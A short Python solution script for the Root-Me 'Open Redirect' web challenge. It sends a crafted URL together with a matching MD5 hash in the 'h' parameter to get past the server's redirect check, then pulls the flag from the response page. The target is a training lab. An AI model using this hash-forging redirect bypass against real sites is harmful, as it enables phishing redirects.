# 52 - Open Redirect
# Solution: To redirect to a site of choice, change URL and corresponding hash value (MD5) of the URL in `h` field.

import requests
from bs4 import BeautifulSoup

url = "http://challenge01.root-me.org/web-serveur/ch52/"
payload = {
    "url": "https://tieuphuong.com",
    "h": "48e7faf151df386c100cb3080e76d884"
}

response = requests.get(url, params=payload)
# print(response.text)
soup = BeautifulSoup(response.content, 'html.parser')
p_tag = soup.find('p')
p_text = p_tag.text
keyword = p_text.split(' ')[5].strip()
print(keyword)